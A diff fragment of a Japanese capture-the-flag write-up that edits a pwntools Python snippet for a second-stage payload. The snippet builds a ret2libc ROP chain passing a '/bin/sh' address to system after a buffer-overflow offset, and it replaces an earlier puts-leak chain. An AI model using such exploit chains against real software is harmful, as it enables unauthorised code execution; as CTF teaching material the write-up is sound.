@@ -36,13 +36,12 @@ ROPの最初は`e.plt["puts"]`の呼び出しから始まる。実行ファイ�
 
 ## シェル起動(二度目のペイロード)
 ```python
-offset = 0x38
+payload = b''
 payload += b'A' * offset
-payload += pwn.p64(e.got['puts']) # rdi
+payload += pwn.p64(binsh) # rdi
 payload += pwn.p64(1)
-payload += pwn.p64(e.plt['puts'])
-payload += pwn.p64(e.sym['main'])
-io.sendline(payload)
+payload += pwn.p64(rop.find_gadget(['ret']).address + libc_base)
+payload += pwn.p64(sys)
 ```
 これもやるだけ(writeup 書くの 飽きた)
 
